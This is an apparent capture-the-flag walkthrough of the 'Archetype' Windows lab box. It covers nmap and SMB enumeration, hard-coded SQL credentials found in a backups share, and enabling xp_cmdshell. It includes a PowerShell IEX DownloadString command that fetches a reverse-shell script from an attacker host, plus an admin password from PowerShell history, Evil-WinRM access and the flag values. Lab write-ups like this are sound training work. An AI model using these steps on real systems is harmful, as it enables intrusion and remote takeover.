```
ping 10.129.24.89
PING 10.129.24.89 (10.129.24.89) 56(84) bytes of data.
64 bytes from 10.129.24.89: icmp_seq=1 ttl=127 time=10.9 ms

```
Windows based on 127 ttl response 

`sudo nmap -vvv -Pn -sCV --reason -p0-65535  -T4 10.129.24.89`

```
PORT      STATE SERVICE      REASON          VERSION                       
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                           
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                   
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2026-01-12T18:13:24+00:00; -1s from scanner time.     
| ms-sql-ntlm-info:                                                                                                                                          
|   10.129.24.89:1433:                                            
|     Target_Name: ARCHETYPE                                        
|     NetBIOS_Domain_Name: ARCHETYPE                                                                                                                         
|     NetBIOS_Computer_Name: ARCHETYPE                                        
|     DNS_Domain_Name: Archetype                                  
|     DNS_Computer_Name: Archetype                                
|_    Product_Version: 10.0.17763                                 
| ms-sql-info:                                                    
|   10.129.24.89:1433:                                            
|     Version:                                                    
|       name: Microsoft SQL Server 2017 RTM                       
|       number: 14.00.1000.00                                       
|       Product: Microsoft SQL Server 2017                                                                                                                   
|       Service pack level: RTM                                               
|       Post-SP patches applied: false        
|_    TCP port: 1433                                     


5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found                                                
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC


Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 14606/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40913/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 47890/udp): CLEAN (Timeout)
|   Check 4 (port 64631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-12T18:13:19
|_  start_date: N/A
|_clock-skew: mean: 1h35m59s, deviation: 3h34m41s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-01-12T10:13:20-08:00

```


SMB allows for guest logins 

```
smbclient -N -L //10.129.24.89 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

```

We see backups is a non default share 

It contains a file prod.dtsConfig 

This file contains hard coded creds to the sql_svc account  

```
cat prod.dtsConfig                                                   
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

We can try to use these creds to access win rm 

We make use of impackets mssqlclient.py script to get a shell from the account 

```
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ ./mssqlclient.py ARCHETYPE/sql_svc@10.129.24.89 -windows-auth
```


From here we have to configure `xp_cmdshell` to work. From there we will have to create a powershell file to download and run on the target machine to get a reverse shell 

EXEC xp_cmdshell 'powershell  "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.14.212/revshell.ps1'')"';

The user file is on the svc_sql desktop. per usual 

```
type C:\Users\sql_svc\Desktop\user.txt
3e7b102e78218e935bf3f4951fec21a3
```

Once we have the shell it is time to enumerate potential winows priv esc paths 


```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!! exit

```


using evil-rm we are able to read root.txt 


```
Evil-WinRM* PS C:\Users\Administrator> cd
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:36 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```


Things I did not know in this box 

1. Activating xp_cmdshell
2. Using http server to use a powershell command to get my reverse shell and having that file initiate the connection 
3. Why my shell was so bad. 
	1. Windows Priv esc path `_gci -Force -Recurse -Exclude “desktop.ini” | where {! $_.PSIsContainer}_`
	2. Manual enumeration method to see all files 